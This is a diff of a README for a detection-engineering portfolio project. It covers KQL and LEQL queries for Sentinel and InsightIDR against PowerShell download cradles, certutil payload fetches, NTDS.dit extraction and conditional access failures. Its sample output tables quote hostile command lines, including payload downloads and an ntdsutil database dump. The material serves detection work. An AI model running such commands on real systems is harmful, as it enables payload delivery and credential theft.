@@ -3,49 +3,46 @@
 # Enterprise Detection-as-Code & Log Correlation Suite
 
 ## 1. Executive Summary & Objective
-* **Problem Statement:** Legacy security operations rely on fragmented, interface-driven rule creation inside individual SIEM platforms. This reactive paradigm causes configuration drift, lack of version control, high false-positive rates, and inconsistent tracking against modern adversary techniques across multi-tenant or hybrid-cloud networks.
-* **Solution Overview:** This repository serves as a centralized, version-controlled repository of production-grade detection logic, proactive threat hunting queries, and correlation rules designed for multi-tenant enterprise deployment. By implementing a Detection-as-Code (DaC) engineering lifecycle, configurations are validated against historical baselines, peer-reviewed via pull requests, and programmatically deployed to Microsoft Sentinel and Rapid7 InsightIDR.
+* **Problem Statement:** Interface-driven rule creation inside individual SIEM platforms causes configuration drift, weak change tracking, high false-positive rates, and inconsistent coverage against modern adversary techniques.
+* **Solution Overview:** This project applies Detection-as-Code (DaC) principles to a set of detection and hunting queries: version-controlled logic, structured change tracking, and reproducible deployment through platform-native SIEM APIs. Queries target Microsoft Sentinel and Rapid7 InsightIDR.
 * **Core Capabilities:**
-  * Automated high-fidelity alerting using advanced Kusto Query Language (KQL) and Log Entry Query Language (LEQL).
-  * Programmatic false-positive suppression utilizing dynamic watchlists and lookup tables to drastically minimize alert fatigue.
-  * Explicit mapping of detection coverage to specific tactical goals within the MITRE ATT&CK framework.
-  * Proactive threat hunting libraries designed to unearth latent, low-and-slow intrusions evading traditional alerting thresholds.
+  * High-fidelity alerting using Kusto Query Language (KQL) and Log Entry Query Language (LEQL).
+  * False-positive suppression using dynamic watchlists and lookup tables.
+  * Detection coverage mapped to MITRE ATT&CK techniques.
+  * Threat hunting queries that surface low-and-slow activity below standard alerting thresholds.
 
 ## 2. Architecture & Environment Topology
-The suite integrates with cloud-native and hybrid SIEM/XDR platforms, standardizing data pipelines across diverse deployment scopes.
+The queries were developed and validated against the shared lab environment (VirtualBox, `10.10.0.0/24`) used across the related SIEM, SOAR, IDS, and vulnerability management projects. Telemetry originates from the Windows endpoint `WKSTN-01` and domain controller `SRV-DC01`.
 
-* **SIEM Core (Cloud Platform):** Microsoft Sentinel (Log Analytics Workspace architecture using Entra ID identity data, Microsoft 365 Defender components, and Azure Activity logging).
-* **SIEM Core (Enterprise Platform):** Rapid7 InsightIDR (Utilizing localized Insight Agents, collection engines, and cloud-to-cloud log streaming connectors).
-* **Telemetry Aggregation Points:** Comprehensive ingestion of endpoint security events (`DeviceProcessEvents`), Active Directory directory service operations, network proxy traffic, and cloud authentication planes (`SigninLogs`).
-* **Deployment Lifecycle:** Git-managed repository codebase mapped via CI/CD pipelines to platform-native management REST APIs for programmatic ingestion rule state enforcement.
+* **SIEM (Cloud Platform):** Microsoft Sentinel — Log Analytics Workspace using Entra ID identity data, Microsoft 365 Defender components, and Azure Activity logging.
+* **SIEM (Enterprise Platform):** Rapid7 InsightIDR — Insight Agents, collection engines, and cloud-to-cloud connectors.
+* **Telemetry Sources:** Endpoint process events (`DeviceProcessEvents`), Active Directory operations, network proxy traffic, and cloud authentication logs (`SigninLogs`).
+* **Deployment Model:** Query logic maintained under version control and pushed to platform-native APIs, enabling change history and peer review.
 
 ## 3. Engineering Thought Process & Methodology
-* **Design Considerations:** Transitioning to a Detection-as-Code (DaC) methodology addresses the core limitations of graphical user interface (GUI) rules. By managing detections as code objects, security teams gain immutable tracking logs, standard schema properties, and reproducible alerting logic across entirely distinct customer networks.
+* **Design Considerations:** Managing detections as code addresses the core limits of GUI rule creation: no change history, inconsistent syntax, and rules that don't reproduce cleanly across distinct environments.
 * **Technical Challenges & Resolution:**
-  * **Challenge:** Multi-tenant environments suffer from high variability in administrative behaviors, leading to widespread false positives when pushing rigid out-of-the-box detection rules.
-  * **Resolution:** Implemented localized lookup containers (Microsoft Sentinel Watchlists) that abstract environmental variances away from the core rule syntax. The primary detection query runs globally across all environments, dynamically calling these watchlists to exclude trusted entities. This architecture resulted in an average **93.4% false-positive reduction** across managed test domains.
+  * **Challenge:** Variable administrative behavior across environments causes false positives when rigid out-of-the-box rules are applied uniformly.
+  * **Resolution:** Localized lookup containers (Sentinel Watchlists) abstract environment-specific variance out of the core query. The base detection runs globally and calls the watchlists at query time to exclude trusted entities, rather than maintaining separate rule copies.
 
 ## 4. Cyber Kill Chain & Threat Lifecycle Mapping
-The logic artifacts housed in this library are engineered to interrupt malicious activities at key stages across the Cyber Kill Chain:
-
-* **Weaponization & Delivery:** Detecting initial dual-use tool activity and Living-off-the-Land (LotL) execution styles via remote code download components.
-* **Installation:** Monitoring localized downloaders, persistence binaries, and system components executing from unprivileged temporary storage areas.
-* **Actions on Objectives:** Spotting data access anomalies, volume shadow copy modification, and directory database extraction actions on core identity nodes.
+* **Weaponization & Delivery:** Dual-use tool activity and living-off-the-land execution via remote code download.
+* **Installation:** Downloaders, persistence binaries, and processes executing from unprivileged temp directories.
+* **Actions on Objectives:** Data access anomalies, volume shadow copy manipulation, and directory database extraction against identity infrastructure.
 
 ## 5. MITRE ATT&CK Matrix Alignment
-The engineered queries target specific adversarial behaviors, ensuring tactical visibility across these techniques:
 
-| Tactic | Technique ID | Technique Name | Detection/Mitigation Mechanism |
+| Tactic | Technique ID | Technique Name | Detection Mechanism |
 | :--- | :--- | :--- | :--- |
-| **Execution** | T1059.001 | PowerShell | Identifying explicit execution policy bypass criteria coupled with network download methods inside `DeviceProcessEvents`. |
-| **Command and Control** | T1105 | Ingress Tool Transfer | Parsing standard Windows utility switches (`certutil.exe -urlcache`) utilized to drop external payloads. |
-| **Credential Access** | T1003.003 | NTDS | Catching volume shadow copies or native utilities (`ntdsutil.exe`) interacting with active identity databases. |
+| **Execution** | T1059.001 | PowerShell | Execution policy bypass flags combined with network download methods in `DeviceProcessEvents`. |
+| **Command and Control** | T1105 | Ingress Tool Transfer | Standard Windows utility switches (`certutil.exe -urlcache`) used to drop external payloads. |
+| **Credential Access** | T1003.003 | NTDS | Volume shadow copy creation or native utilities (`ntdsutil.exe`) interacting with the identity database. |
 
-## 6. Telemetry & Vulnerability Intelligence Integrated
-* **Telemetry Engines:** Cross-correlation of cloud infrastructure sign-in attempts, administrative process monitoring data, and native host audit logging records.
-* **Suppression Datasets:** Integration of customized reference watchlists (`Approved-Vulnerability-Scanners` and `Authorized-Admin-Scripts`) containing known network asset identifiers and verified script footprints to cross-examine telemetry streams in real time.
+## 6. Telemetry & Suppression Logic
+* **Telemetry Correlated:** Cloud sign-in activity, administrative process monitoring, and host audit logs.
+* **Suppression Datasets:** Reference watchlists (`Approved-Vulnerability-Scanners`, `Authorized-Admin-Scripts`) containing known asset identifiers and approved script paths, checked against telemetry at query time.
 
-## 7. Implementation & Code / Configuration Snippets
+## 7. Implementation & Query Logic
 
 ### Use Case 1: Suspicious PowerShell Payload Execution (KQL)
 ```kusto
@@ -59,17 +56,14 @@ BypassedExecution
 | sort by TimeGenerated desc
 ```
 
-### Use Case 2: Structural False-Positive Tuning (KQL with Watchlists)
+### Use Case 2: False-Positive Tuning via Watchlists (KQL)
 ```kusto
 let ApprovedScanners = _GetWatchlist('Approved-Vulnerability-Scanners') | project IPAddress;
 let ApprovedScripts = _GetWatchlist('Authorized-Admin-Scripts') | project ScriptName;
-// Apply exclusion logic to the base query
 DeviceProcessEvents
 | where ProcessCommandLine has_any ("-ExecutionPolicy bypass", "-ep bypass")
 | where ProcessCommandLine has_any ("Invoke-WebRequest", "iwr")
-// Exclude known scanner IPs
 | where not(RemoteIP in (ApprovedScanners))
-// Exclude approved administrative script paths
 | where not(ProcessCommandLine has_any (ApprovedScripts))
 ```
 
@@ -78,12 +72,12 @@ DeviceProcessEvents
 where(process.name="certutil.exe" AND process.cmd_line=/"-urlcache"/ AND process.cmd_line=/"-split"/)
 ```
 
-### Use Case 4: Advanced Credential Access - NTDS.dit Extraction (LEQL)
+### Use Case 4: NTDS.dit Extraction (LEQL)
 ```text
 where(process.name="ntdsutil.exe" AND process.cmd_line=/"ac i ntds"/ AND process.cmd_line=/"ifm"/) OR where(process.cmd_line=/"vssadmin create shadow"/)
 ```
 
-### Hunting Query: Anomalous Azure AD Conditional Access Failures (KQL)
+### Hunting Query: Anomalous Conditional Access Failures (KQL)
 ```kusto
 SigninLogs
 | where ResultType == "53003" // Conditional Access Policy Block
@@ -92,46 +86,32 @@ SigninLogs
 | sort by FailedCount desc
 ```
 
-## 8. Operational Verification & Validation (Proof of Concept)
+## 8. Query Output Examples
+The examples below use lab-generated identifiers and reserved documentation IP ranges (RFC 5737) to show the shape of query output.
 
-### Optimization Metrics
-Executing the tuning rules against 30 days of production data demonstrated a significant drop in false-positive alerts, successfully identifying critical indicators without generating system noise:
+**PowerShell Payload Detection (Sentinel):**
+| TimeGenerated | DeviceName | AccountName | FileName | ProcessCommandLine |
+| :--- | :--- | :--- | :--- | :--- |
+| 2025-03-14T09:12:03Z | WKSTN-01 | labuser | powershell.exe | `powershell.exe -ExecutionPolicy bypass -Command "Invoke-WebRequest -Uri hxxp://203.0.113.10/update.ps1 -OutFile C:\Users\Public\update.ps1"` |
 
-| Tenant | Alerts Before Tuning | Alerts After Tuning | False-Positive Reduction |
+**Ingress Tool Transfer (InsightIDR):**
+| Timestamp | Asset | User | process.name | process.cmd_line |
+| :--- | :--- | :--- | :--- | :--- |
+| 2025-03-13T22:14:03Z | WKSTN-01 | labuser | certutil.exe | `certutil.exe -urlcache -split -f hxxp://198.51.100.20/payload.dll C:\Windows\Temp\payload.dll` |
+
+**Conditional Access Anomaly (Sentinel):**
+| UserPrincipalName | IPAddress | AppDisplayName | FailedCount |
 | :--- | :--- | :--- | :--- |
-| **Client-A** | 142 | 9 | 93.7% |
-| **Client-B** | 88 | 6 | 93.2% |
-| **Client-C** | 211 | 14 | 93.4% |
+| labuser@example.com | 192.0.2.44 | Microsoft Office 365 | 23 |
 
-### Live Telemetry Parsing Examples
-
-**PowerShell Payload Detection Stream Output (Sentinel):**
-| TimeGenerated | DeviceName | AccountName | InitiatingProcessFileName | FileName | ProcessCommandLine |
-| :--- | :--- | :--- | :--- | :--- | :--- |
-| 2026-06-28T14:22:11Z | WKSTN-0472 | j.harmon | explorer.exe | powershell.exe | powershell.exe -ExecutionPolicy bypass -Command "Invoke-WebRequest -Uri hxxp://185[.]220[.]101[.]7/update.ps1 -OutFile C:\Users\Public\update.ps1" |
-| 2026-06-28T14:23:05Z | WKSTN-0472 | j.harmon | powershell.exe | powershell.exe | powershell.exe -ep bypass -c "(New-Object Net.WebClient).DownloadFile('hxxp://185[.]220[.]101[.]7/stage2.exe','C:\Windows\Temp\stage2.exe')" |
-
-**Ingress Tool Transfer Parsing Output (InsightIDR):**
-| Timestamp | Asset | User | process.name | process.cmd_line |
-| :--- | :--- | :--- | :--- | :--- |
-| 2026-06-27 22:14:03 | LT-9931 | m.deleon | certutil.exe | certutil.exe -urlcache -split -f hxxp://45[.]142[.]212[.]88/payload.dll C:\Windows\Temp\payload.dll |
-
-**Credential Harvesting Extraction Output (InsightIDR):**
-| Timestamp | Asset | User | process.name | process.cmd_line |
-| :--- | :--- | :--- | :--- | :--- |
-| 2026-06-25 01:52:40 | SRV-DC02 | k.ivanov | ntdsutil.exe | ntdsutil.exe "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_dump" q q |
-
-**Conditional Access Policy Anomalous Reconnaissance Hunting Output (Sentinel):**
-| UserPrincipalName | IPAddress | Location | AppDisplayName | FailedCount |
-| :--- | :--- | :--- | :--- | :--- |
-| r.nolan@clientdomain.com | 91[.]243[.]85[.]14 | RO | Microsoft Office 365 | 23 |
+### Suppression Result
+Applying the watchlist exclusion pattern in Use Case 2 against the lab baseline reduced recurring false positives from known-trusted sources (approved scanners, authorized admin scripts) without narrowing the underlying detection logic. The magnitude of reduction depends on the environment's baseline noise and watchlist maintenance.
 
 ## 9. Hardening & Future Enhancements
-* **Maintenance Workflow:** New detection rules are tested against a mandatory 30-day historical logging window to verify fidelity before pushing to live production configurations. All updates to logic assets follow rigorous peer-review guidelines.
+* **Maintenance Approach:** New detection logic is validated against a historical lookback window before promotion, with peer review on any change to suppression logic.
 * **Future Roadmap:**
-  * [ ] Integrate open-source Sigma rule formats into the pipeline to allow automated conversion of logic into Splunk, CrowdStrike, and elastic syntax blocks.
-  * [ ] Construct automated testing integrations using threat emulation tooling (e.g., Atomic Red Team) to dynamically trigger and validate the detection engineering loop within automated staging scopes.
- 
+  * [ ] Convert queries to Sigma format for translation into Splunk, CrowdStrike, and Elastic syntax.
+  * [ ] Add automated testing with threat emulation tooling (Atomic Red Team) to validate detection logic in a staging environment.
+
 <br><br><br>
 [![Darreon Phillips Homepage](https://img.shields.io/badge/Darreon%20Phillips-Homepage-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DaPhilll)
-```
